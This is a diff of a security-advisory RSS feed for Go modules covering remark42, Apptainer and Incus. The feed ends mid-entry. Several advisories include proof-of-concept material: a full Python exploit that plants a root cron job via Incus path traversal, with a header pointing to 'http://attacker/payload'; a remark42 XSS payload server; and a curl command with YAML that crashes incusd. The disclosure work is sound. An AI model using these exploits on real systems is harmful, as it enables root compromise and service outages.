@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-06-26T18:31:15.061Z</updated>
+    <updated>2026-06-26T19:30:17.092Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,1405 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/umputun/remark42] Remark42: Cross-Site Scripting (XSS) on /api/v1/img via content-type spoofing]]></title>
+        <id>https://github.com/advisories/GHSA-4c8j-mgm4-qqvp</id>
+        <link href="https://github.com/advisories/GHSA-4c8j-mgm4-qqvp"/>
+        <updated>2026-06-26T19:26:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The remark42 image proxy fetches an arbitrary remote URL and re-serves the response from remark42's own origin. The download path decides whether the fetched resource is an image by looking only at the <code>Content-Type</code> header the remote server claims — it never inspects the actual bytes. The serving path then derives the response <code>Content-Type</code> by sniffing those bytes with <code>http.DetectContentType</code>.</p>
+<p>An attacker hosts a URL that sets <code>Content-Type</code> to <code>image/png</code> but returns an HTML/JavaScript body:</p>
+<ul>
+<li>the download check sees <code>image/png</code> → accepts it;</li>
+<li>the serve path sniffs the body → emits <code>Content-Type: text/html</code>;</li>
+<li>the browser renders attacker HTML/JS as a document in remark42's origin.</li>
+</ul>
+<h3 id="details">Details</h3>
+<h4 id="downloader">Downloader</h4>
+<p><code>backend/app/rest/proxy/image.go</code> — <code>downloadImage()</code>, lines 189-206:</p>
+<pre><code class="language-go">contentType := resp.Header.Get("Content-Type")
+if !strings.HasPrefix(contentType, "image/") {
+    return nil, fmt.Errorf("invalid content type %s", contentType)
+}
+
+maxSize := 5 * 1024 * 1024 // 5MB default
+if p.ImageService != nil &amp;&amp; p.ImageService.MaxSize &gt; 0 {
+    maxSize = p.ImageService.MaxSize
+}
+lr := io.LimitReader(resp.Body, int64(maxSize)+1)
+imgData, err := io.ReadAll(lr)
+if err != nil {
+    return nil, fmt.Errorf("unable to read image body: %w", err)
+}
+if len(imgData) &gt; maxSize {
+    return nil, fmt.Errorf("image is too large")
+}
+return imgData, nil          // &lt;-- bytes never validated, returned as-is
+</code></pre>
+<p>Send <code>Content-Type: image/png</code> and the check passes regardless of what the body actually contains.</p>
+<h4 id="server">Server</h4>
+<p><code>backend/app/rest/proxy/image.go</code> — <code>Handler()</code>, line 131:</p>
+<pre><code class="language-go">w.Header().Add("Content-Type", p.ImageService.ImgContentType(img))
+_, err = io.Copy(w, bytes.NewReader(img))
+</code></pre>
+<p><code>backend/app/store/image/image.go</code> — <code>ImgContentType()</code>, lines 242-249:</p>
+<pre><code class="language-go">func (s *Service) ImgContentType(img []byte) string {
+    contentType := http.DetectContentType(img)
+    if contentType == "application/octet-stream" {
+        return "image/*"
+    }
+    return contentType                 // &lt;-- returns text/html for an HTML body
+}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">self.send_response(200)
+self.send_header("Content-Type", "image/png")
+self.send_header("Content-Length", str(len(body)))
+self.end_headers()
+self.wfile.write(body)            # body = &lt;!DOCTYPE html&gt;&lt;script&gt;...&lt;/script&gt;
+</code></pre>
+<p>Then have the victim open <code>https://&lt;remark42-host&gt;/api/v1/img?src=&lt;base64(attacker-host)&gt;</code> top-level.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>The script can issue authenticated, same-origin API calls with <code>credentials: 'include'</code> — the JWT cookie is sent automatically.</li>
+<li>The script can read the <code>XSRF-TOKEN</code> cookie and re-send it as the <code>X-XSRF-TOKEN</code> header, defeating CSRF protection. The attacker acts as the victim: delete/edit their comments, change their settings, and — if the victim is admin — perform admin actions.</li>
+</ul>
+<p>Triggering requires no remark42 account on the target instance; the attacker only needs to host the malicious upstream URL and deliver the proxy link to a victim by any means (email, DM, link on another site, etc.).</p>
+<h3 id="fix">Fix</h3>
+<p><code>v1.16.0</code> adds layered defense to <code>/api/v1/img</code> and <code>/api/v1/picture/{user}/{id}</code>:</p>
+<ul>
+<li><code>rest.SafeImgContentType</code> validates sniffed body bytes against a strict allowlist (<code>image/png</code>, <code>image/jpeg</code>, <code>image/gif</code>, <code>image/webp</code>, <code>image/bmp</code>, <code>image/x-icon</code>). Non-image content returns <code>415</code> with no body echo. SVG is implicitly excluded.</li>
+<li>Every response carries <code>Content-Security-Policy: default-src 'none'; sandbox; frame-ancestors 'none'</code>, <code>X-Content-Type Options: nosniff</code>, and <code>Content-Disposition: inline; filename="image"</code>.</li>
+<li>The ETag is bumped to <code>"v2:&lt;base64(src)&gt;"</code>. Browsers that revalidate cached pre-fix responses get a fresh validated <code>200</code> instead of a <code>304</code> against the poisoned cached entry.</li>
+<li>The strict <code>default-src 'none'; sandbox</code> CSP also applies to all <code>/api/v1/*</code> routes as defense-in-depth.</li>
+</ul>
+<h4 id="residual-exposure">Residual exposure</h4>
+<p>Browser-local caches that already hold a pre-fix <code>text/html</code> response with <code>Cache-Control: max-age=2592000</code> keep serving it from local store until the TTL expires or the cache is evicted under memory pressure. The ETag bump only reaches clients that revalidate during the cached lifetime. Operators running a CDN/edge cache in front of remark42 should purge <code>/api/v1/img</code> after deploying <code>v1.16.0</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/umputun/remark42/security/advisories/GHSA-4c8j-mgm4-qqvp">https://github.com/umputun/remark42/security/advisories/GHSA-4c8j-mgm4-qqvp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48788">https://nvd.nist.gov/vuln/detail/CVE-2026-48788</a></li>
+<li><a href="https://github.com/umputun/remark42/commit/78d6de6bce1e961f023969da3ec8a00dd80c9ae8">https://github.com/umputun/remark42/commit/78d6de6bce1e961f023969da3ec8a00dd80c9ae8</a></li>
+<li><a href="https://github.com/umputun/remark42/releases/tag/v1.16.0">https://github.com/umputun/remark42/releases/tag/v1.16.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4c8j-mgm4-qqvp">https://github.com/advisories/GHSA-4c8j-mgm4-qqvp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4c8j-mgm4-qqvp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T19:26:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/apptainer/apptainer] Apptainer has incorrect path matching for 'limit container paths' directive ]]></title>
+        <id>https://github.com/advisories/GHSA-cr2j-534f-mf3g</id>
+        <link href="https://github.com/advisories/GHSA-cr2j-534f-mf3g"/>
+        <updated>2026-06-26T19:20:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The <code>limit container paths directive</code> in <code>apptainer.conf</code> is intended to allow a system administrator limit the paths from which containers can be run, under setuid mode. Due to incorrect matching of a path string, sibling directories with similar names may incorrectly be allowed.</p>
+<p>For example, the configuration:</p>
+<pre><code>limit container paths = /data/safe
+</code></pre>
+<p>Will also allow containers in /data/safe-but-unsafe to be run.</p>
+<h3 id="patches">Patches</h3>
+<p>The issue is patched in apptainer version 1.5.1.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If developers do not use setuid mode or do not use the <code>limit container paths</code> functionality, then this issue does not affect their installation. Note that, as documented [1], if user namespaces are allowed for unrestricted use then this functionality does not stop users from running any container of their choice.</p>
+<p>If developers do use the <code>limit container paths</code> functionality they are advised to update.</p>
+<h3 id="credit">Credit</h3>
+<p>This vulnerability was discovered and disclosed to the Apptainer project by Dave Trudgian of Sylabs.</p>
+<h3 id="resources">Resources</h3>
+<p>[1] <a href="https://apptainer.org/docs/admin/latest/configfiles.html#limiting-container-execution">https://apptainer.org/docs/admin/latest/configfiles.html#limiting-container-execution</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apptainer/apptainer/security/advisories/GHSA-cr2j-534f-mf3g">https://github.com/apptainer/apptainer/security/advisories/GHSA-cr2j-534f-mf3g</a></li>
+<li><a href="https://github.com/advisories/GHSA-cr2j-534f-mf3g">https://github.com/advisories/GHSA-cr2j-534f-mf3g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cr2j-534f-mf3g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-26T19:20:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has an arbitrary file write on its client due to trusted image hash]]></title>
+        <id>https://github.com/advisories/GHSA-f6m5-xw2g-xc4x</id>
+        <link href="https://github.com/advisories/GHSA-f6m5-xw2g-xc4x"/>
+        <updated>2026-06-26T19:13:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An arbitrary file write exists in the Incus client when a malicious image server returns a crafted <code>Incus-Image-Hash</code> header. This can lead to arbitrary command execution as root on the server.</p>
+<h3 id="details">Details</h3>
+<ul>
+<li><code>cmd/incusd/images.go:611-684</code> handles <code>source.type=url</code> by HEADing the user-supplied URL, reading <code>Incus-Image-Hash</code> and <code>Incus-Image-URL</code>, and passing them to <code>imageDownload()</code> as <code>Alias</code>  and <code>Server</code>.</li>
+<li><code>cmd/incusd/daemon_images.go:91-92</code> defaults <code>fp</code> to the caller-controlled alias string.</li>
+<li><code>cmd/incusd/daemon_images.go:333-335</code> builds <code>destName := filepath.Join(destDir, fp)</code>.</li>
+<li><code>cmd/incusd/daemon_images.go:469-523</code> enters the <code>direct</code> protocol branch, opens <code>destName</code> with <code>os.Create()</code>, and copies the HTTP response into that file.</li>
+<li><code>cmd/incusd/daemon_images.go:528-532</code> validates the SHA-256 only after the file has already been created and populated.</li>
+<li><code>cmd/incusd/daemon_images.go:337-344</code> cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.</li>
+</ul>
+<p>A malicious image server returning something along the following will cause the arbitrary file write.</p>
+<pre><code>Incus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce
+Incus-Image-URL: http://attacker/payload
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>The script below creates a malicious image server and requests an Incus server to fetch the image. File write occurs when the image is unpacked.</p>
+<p>The following script was generated by an LLM.</p>
+<pre><code>#!/usr/bin/env python3
+"""Direct image URL hash path traversal to transient host cron write.
+
+For `source.type=url`, Incus first HEADs an attacker-controlled URL and trusts the `Incus-Image-Hash` header as the expected fingerprint. The direct download path then creates `/var/lib/incus/images/&lt;hash&gt;` before validating that the hash is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the image directory.
+
+Default mode is dry-run. With --execute-trigger this script starts a tiny HTTP server, returns a traversal hash pointing at cron, streams the cron payload, and keeps the response open so the daemon-side cleanup does not immediately remove the file.
+
+"""
+
+from __future__ import annotations
+
+import argparse
+import http.client
+import json
+import shlex
+import socket
+import ssl
+import sys
+import threading
+import time
+import urllib.parse
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from typing import Any
+
+
+DEFAULT_SOCKET = "/var/lib/incus/unix.socket"
+DEFAULT_TRAVERSAL = "../../../../etc/cron.d/incus-direct-image-url-rce"
+
+
+class UnixHTTPConnection(http.client.HTTPConnection):
+    def __init__(self, socket_path: str, timeout: int = 120):
+        super().__init__("incus", timeout=timeout)
+        self.socket_path = socket_path
+
+    def connect(self) -&gt; None:
+        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        sock.settimeout(self.timeout)
+        sock.connect(self.socket_path)
+        self.sock = sock
+
+
+class RCEHTTPServer(ThreadingHTTPServer):
+    hash_path: str
+    advertise_url: str
+    payload: bytes
+    hold_seconds: int
+    payload_requested: threading.Event
+
+
+class DirectImageHandler(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+    server_version = "direct-image-rce/1.0"
+
+    def log_message(self, fmt: str, *args: Any) -&gt; None:
+        print(f"[http] {self.address_string()} - {fmt % args}", flush=True)
+
+    def do_HEAD(self) -&gt; None:
+        if self.path != "/stage":
+            self.send_error(404)
+            return
+
+        srv = self.server
+        assert isinstance(srv, RCEHTTPServer)
+        self.send_response(200)
+        self.send_header("Incus-Image-Hash", srv.hash_path)
+        self.send_header("Incus-Image-URL", srv.advertise_url.rstrip("/") + "/payload")
+        self.send_header("Connection", "close")
+        self.end_headers()
+
+    def do_GET(self) -&gt; None:
+        if self.path != "/payload":
+            self.send_error(404)
+            return
+
+        srv = self.server
+        assert isinstance(srv, RCEHTTPServer)
+        srv.payload_requested.set()
+
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(srv.payload)
+        self.wfile.flush()
+        print(f"[*] payload bytes written to daemon response; holding for {srv.hold_seconds}s", flush=True)
+        time.sleep(srv.hold_seconds)
+        self.close_connection = True
+
+
+def quote(value: str) -&gt; str:
+    return urllib.parse.quote(value, safe="")
+
+
+def tls_context(args: argparse.Namespace) -&gt; ssl.SSLContext:
+    if args.insecure:
+        ctx = ssl._create_unverified_context()
+    else:
+        ctx = ssl.create_default_context(cafile=args.cacert)
+
+    if args.cert:
+        ctx.load_cert_chain(args.cert, args.key)
+
+    return ctx
+
+
+def connection(args: argparse.Namespace) -&gt; http.client.HTTPConnection:
+    if args.url:
+        parsed = urllib.parse.urlparse(args.url)
+        if parsed.scheme != "https":
+            raise ValueError("--url must use https")
+
+        return http.client.HTTPSConnection(
+            parsed.hostname,
+            parsed.port or 8443,
+            timeout=args.timeout,
+            context=tls_context(args),
+        )
+
+    return UnixHTTPConnection(args.socket, timeout=args.timeout)
+
+
+def request_json(
+    args: argparse.Namespace,
+    method: str,
+    path: str,
+    obj: dict[str, Any] | None,
+    allow_error: bool = False,
+) -&gt; tuple[int, dict[str, Any]]:
+    body = None if obj is None else json.dumps(obj).encode("utf-8")
+    headers = {"Host": "incus"}
+    if body is not None:
+        headers["Content-Type"] = "application/json"
+
+    conn = connection(args)
+    conn.request(method, path, body=body, headers=headers)
+    resp = conn.getresponse()
+    raw = resp.read()
+    conn.close()
+
+    try:
+        data = json.loads(raw) if raw else {}
+    except json.JSONDecodeError:
+        data = {"raw": raw.decode("utf-8", "replace")}
+
+    if not allow_error and (resp.status &gt;= 400 or data.get("type") == "error"):
+        raise RuntimeError(f"{method} {path} failed with HTTP {resp.status}: {data}")
+
+    return resp.status, data
+
+
+def images_path(project: str) -&gt; str:
+    return "/1.0/images?project=" + quote(project)
+
+
+def cron_payload(command: str) -&gt; bytes:
+    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode("utf-8")
+
+
+def image_url_body(project_url: str, public: bool) -&gt; dict[str, Any]:
+    return {
+        "source": {
+            "type": "url",
+            "url": project_url.rstrip("/") + "/stage",
+        },
+        "public": public,
+    }
+
+
+def start_server(args: argparse.Namespace, payload: bytes) -&gt; RCEHTTPServer:
+    server = RCEHTTPServer((args.listen_host, args.listen_port), DirectImageHandler)
+    server.hash_path = args.hash_path
+    server.advertise_url = args.advertise_url
+    server.payload = payload
+    server.hold_seconds = args.hold_seconds
+    server.payload_requested = threading.Event()
+
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    return server
+
+
+def main() -&gt; int:
+    parser = argparse.ArgumentParser(description="Incus direct image URL hash traversal cron RCE PoC")
+    parser.add_argument("--socket", default=DEFAULT_SOCKET, help="Incus Unix socket")
+    parser.add_argument("--url", help="remote Incus URL, for example https://host.ctf:8443")
+    parser.add_argument("--cert", help="client certificate for remote Incus")
+    parser.add_argument("--key", help="client private key for remote Incus")
+    parser.add_argument("--cacert", help="CA certificate for remote Incus")
+    parser.add_argument("--insecure", action="store_true", help="disable TLS verification")
+    parser.add_argument("--timeout", type=int, default=120, help="Incus request timeout")
+    parser.add_argument("--project", default="default", help="project used for image import")
+    parser.add_argument("--public", action="store_true", help="mark imported image public")
+    parser.add_argument("--listen-host", default="0.0.0.0", help="HTTP listen address")
+    parser.add_argument("--listen-port", type=int, default=8088, help="HTTP listen port")
+    parser.add_argument("--advertise-url", default="http://127.0.0.1:8088", help="URL reachable by the Incus daemon")
+    parser.add_argument("--hash-path", default=DEFAULT_TRAVERSAL, help="value returned in Incus-Image-Hash")
+    parser.add_argument("--hold-seconds", type=int, default=90, help="keep payload response open for this many seconds")
+    parser.add_argument("--command", default="id &gt; /tmp/incus-direct-image-url-rce", help="command cron should run")
+    parser.add_argument("--execute-trigger", action="store_true", help="start server and trigger POST /1.0/images")
+    parser.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute-trigger")
+    args = parser.parse_args()
+
+    if bool(args.cert) != bool(args.key):
+        parser.error("--cert and --key must be supplied together")
+    if args.execute_trigger and not args.yes_i_understand_this_writes_host_file:
+        parser.error("--execute-trigger requires --yes-i-understand-this-writes-host-file")
+
+    payload = cron_payload(args.command)
+    trigger_body = image_url_body(args.advertise_url, args.public)
+
+    print("[*] exploit primitive: direct image URL unvalidated hash path host write")
+    print(f"[*] HEAD URL served to daemon: {args.advertise_url.rstrip()}/stage")
+    print(f"[*] returned Incus-Image-Hash: {args.hash_path}")
+    print(f"[*] returned Incus-Image-URL: {args.advertise_url.rstrip()}/payload")
+    print(f"[*] expected escaped host target from default Incus dir: /etc/cron.d/incus-direct-image-url-rce")
+    print(f"[*] cron payload: {payload.decode().rstrip()}")
+    print(f"[*] trigger body: {json.dumps(trigger_body, sort_keys=True)}")
+
+    if not args.execute_trigger:
+        print("[*] dry run only; pass --execute-trigger and --yes-i-understand-this-writes-host-file to test")
+        return 0
+
+    server = start_server(args, payload)
+    print(f"[*] HTTP server listening on {args.listen_host}:{args.listen_port}")
+
+    status, data = request_json(args, "POST", images_path(args.project), trigger_body, allow_error=True)
+    print(f"[*] POST /1.0/images HTTP {status}: {json.dumps(data, indent=2, sort_keys=True)}")
+
+    if server.payload_requested.wait(timeout=min(args.hold_seconds, 30)):
+        print("[*] daemon requested payload; cron file should exist until the held response is released")
+    else:
+        print("[!] daemon did not request payload within the wait window")
+
+    print("[*] leaving HTTP server active for the remaining hold window")
+    time.sleep(max(0, args.hold_seconds - 30))
+    server.shutdown()
+    server.server_close()
+    return 0
+
+
+if __name__ == "__main__":
+    try:
+        raise SystemExit(main())
+    except BrokenPipeError:
+        raise SystemExit(1)
+    except Exception as exc:
+        print(f"[-] {exc}", file=sys.stderr)
+        raise SystemExit(1)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An arbitrary file write on the client with root privileges; possibly leading to arbitrary command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x">https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x</a></li>
+<li><a href="https://github.com/advisories/GHSA-f6m5-xw2g-xc4x">https://github.com/advisories/GHSA-f6m5-xw2g-xc4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f6m5-xw2g-xc4x</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T19:13:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7)]]></title>
+        <id>https://github.com/advisories/GHSA-xhqx-mgh3-3h7q</id>
+        <link href="https://github.com/advisories/GHSA-xhqx-mgh3-3h7q"/>
+        <updated>2026-06-26T19:07:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>(*backend).CreateCustomVolumeFromBackup</code> in <a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go"><code>internal/server/storage/backend.go</code></a> contains an unguarded <code>*time.Time</code> dereference on the <code>ExpiresAt</code> field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with <code>can_create_storage_volumes</code> permission on any project can crash the <code>incusd</code> daemon by uploading a backup tarball whose <code>volume_snapshots[*].expires_at</code> field is absent.</p>
+<p>This is a sibling-field variant of GHSA-r7w7-mmxr-47r9 (CVE-2026-40197). Commit <code>985a1dedf9f3e7ba729c93b654905ed510de25c2</code> added <code>if s == nil</code> at the top of the loop body, but did not guard the adjacent <code>*snapshot.ExpiresAt</code> deref 19 lines later. Every other consumer of <code>Config.VolumeSnapshots[i].ExpiresAt</code> in this same file already gates the deref with a nil-check — the asymmetric guard is the bug.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go"><code>internal/server/storage/backend.go</code></a>, <code>CreateCustomVolumeFromBackup</code>:</p>
+<pre><code class="language-go">// Line 7710-7714 — the parent fix from GHSA-r7w7
+for _, s := range srcBackup.Config.VolumeSnapshots {
+    if s == nil {
+        return errors.New("Bad snapshot definition found in index")
+    }
+    snapshot := s
+    snapName := snapshot.Name
+    // ...
+    // Line 7731 — UNGUARDED *time.Time deref:
+    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,
+        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,
+        *snapshot.ExpiresAt,   // &lt;-- panics when expires_at omitted in YAML
+        snapVol.ContentType(), true, true)
+</code></pre>
+<p><code>ExpiresAt</code> is declared <code>*time.Time</code> (<code>shared/api/storage_pool_volume_snapshot.go:21,88</code>). Every other consumer in the same file already uses the safe pattern:</p>
+<table>
+<thead>
+<tr>
+<th>Line</th>
+<th>Code</th>
+<th>Guarded?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>909-910</td>
+<td><code>CreateInstanceFromBackup</code></td>
+<td>YES</td>
+</tr>
+<tr>
+<td>1134-1135</td>
+<td>refresh path</td>
+<td>YES</td>
+</tr>
+<tr>
+<td>1422-1423</td>
+<td>migration path</td>
+<td>YES</td>
+</tr>
+<tr>
+<td><strong>7731</strong></td>
+<td><strong><code>CreateCustomVolumeFromBackup</code></strong></td>
+<td><strong>NO</strong></td>
+</tr>
+</tbody></table>
+<h2 id="reach">Reach</h2>
+<ol>
+<li>Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the <code>can_create_storage_volumes</code> entitlement on any project. Same auth gate as parent GHSA-r7w7.</li>
+<li><code>POST /1.0/storage-pools/&lt;pool&gt;/volumes/custom</code> with <code>Content-Type: application/octet-stream</code> and <code>X-Incus-name: &lt;name&gt;</code>.</li>
+<li>Body is a tar containing <a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml"><code>backup/index.yaml</code></a> with <code>type: custom</code>, a non-nil <code>volume:</code> block, and <code>volume_snapshots: [{name: snap0}]</code> (no <code>expires_at</code> field).</li>
+<li><code>cmd/incusd/storage_volumes.go:storagePoolVolumesPost</code> -&gt; <code>backup.GetInfo</code> parses the yaml -&gt; <code>pool.CreateCustomVolumeFromBackup</code> -&gt; the <code>s == nil</code> guard at 7712 passes (snapshot pointer is non-nil) -&gt; <code>*snapshot.ExpiresAt</code> on line 7731 panics on the nil <code>*time.Time</code>.</li>
+<li>No <code>recover()</code> is installed in the operation runner, so the panic kills the entire <code>incusd</code> process. Repeated POSTs are a persistent denial of service.</li>
+</ol>
+<p>Minimal <a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml"><code>backup/index.yaml</code></a>:</p>
+<pre><code class="language-yaml">name: poc-vol
+backend: dir
+pool: default
+type: custom
+optimized: false
+optimized_header: false
+snapshots: [snap0]
+config:
+  volume: {name: poc-vol, type: custom, content_type: filesystem, config: {}}
+  volume_snapshots:
+    - name: snap0
+      description: snap0
+      config: {}
+      # expires_at intentionally omitted
+</code></pre>
+<h2 id="proof-of-concept-end-to-end-against-running-daemon">Proof of concept (end-to-end against running daemon)</h2>
+<p>Bundled in the report: <code>make_backup.sh</code> + the resulting 479-byte <code>poc-vol.tar.gz</code>.</p>
+<p>Tested against <code>incus 7.0.0</code> (zabbly latest GA at time of report; build <code>1:0~ubuntu24.04~202605201355</code>) inside a privileged Ubuntu 24.04 container with the default <code>dir</code> storage pool.</p>
+<pre><code class="language-bash">$ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \
+    --data-binary @/tmp/poc-vol.tar.gz \
+    -H 'Content-Type: application/octet-stream' \
+    -H 'X-Incus-name: poc-vol' \
+    http://incus/1.0/storage-pools/default/volumes/custom
+{"type":"async","status":"Operation created","status_code":100,...}
+
+$ ps -ef | grep incusd | grep -v grep    # process is GONE
+</code></pre>
+<p>Daemon panic from <code>/tmp/incus.out</code>:</p>
+<pre><code>panic: runtime error: invalid memory address or nil pointer dereference
+[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x162b938]
+
+goroutine 422 [running]:
+github.com/lxc/incus/v7/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)
+    /build/incus/internal/server/storage/backend.go:7731 +0xb48
+main.createStoragePoolVolumeFromBackup.func7(...)
+    /build/incus/cmd/incusd/storage_volumes.go:2915 +0x290
+github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)
+    /build/incus/internal/server/operations/operations.go:307 +0x2c
+created by github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start in goroutine 408
+    /build/incus/internal/server/operations/operations.go:306 +0x168
+</code></pre>
+<p>Stack frame <a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7731"><code>backend.go:7731</code></a> is the literal <code>*snapshot.ExpiresAt</code> line. Same line in v6.0.x LTS is <a href="https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7271"><code>backend.go:7271</code></a> (also panics; v6.0.x additionally lacks the <code>s == nil</code> parent fix so a single nil snapshot pointer also panics there).</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Severity:</strong> denial of service against the entire <code>incusd</code> process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.</li>
+<li><strong>Privileges required:</strong> any authenticated user with <code>can_create_storage_volumes</code> on any project. Not behind the admin tier.</li>
+<li><strong>Network attack surface:</strong> the Incus REST API on <code>:8443</code> or the unix socket.</li>
+<li><strong>CWE-476</strong> — Nil-Pointer Dereference. <strong>CVSS estimate:</strong> 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Mirror the guard pattern already in use at lines 909-910 / 1134-1135 / 1422-1423:</p>
+<pre><code class="language-diff">--- a/internal/server/storage/backend.go
++++ b/internal/server/storage/backend.go
+@@ -7728,9 +7728,14 @@ func (b *backend) CreateCustomVolumeFromBackup(...) error {
+         snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)
+
+         // Validate config and create database entry for new storage volume.
+         // Strip unsupported config keys (in case the export was made from a different type of storage pool).
+-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)
++        var snapExpiryDate time.Time
++        if snapshot.ExpiresAt != nil {
++            snapExpiryDate = *snapshot.ExpiresAt
++        }
++
++        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)
+         if err != nil {
+             return err
+         }
+</code></pre>
+<h2 id="reporter-notes">Reporter notes</h2>
+<p>Reported via Privately-Reported Vulnerability against <code>lxc/incus</code> by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-xhqx-mgh3-3h7q">https://github.com/lxc/incus/security/advisories/GHSA-xhqx-mgh3-3h7q</a></li>
+<li><a href="https://github.com/advisories/GHSA-xhqx-mgh3-3h7q">https://github.com/advisories/GHSA-xhqx-mgh3-3h7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xhqx-mgh3-3h7q</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-26T19:07:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has an argument injection in backup compression algorithm leading to AFW and ACE]]></title>
+        <id>https://github.com/advisories/GHSA-v6mj-8pf4-hhw4</id>
+        <link href="https://github.com/advisories/GHSA-v6mj-8pf4-hhw4"/>
+        <updated>2026-06-26T19:03:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Improper validation of user-provided backup compression algorithm leads to argument injection in the constructed command line. This leads to an arbitrary file write on the host, possibly leading to arbitrary command execution.</p>
+<h3 id="details">Details</h3>
+<p>Incus validates <code>compression_algorithm</code> by parsing it into fields and checking only the first token against an allowlist:</p>
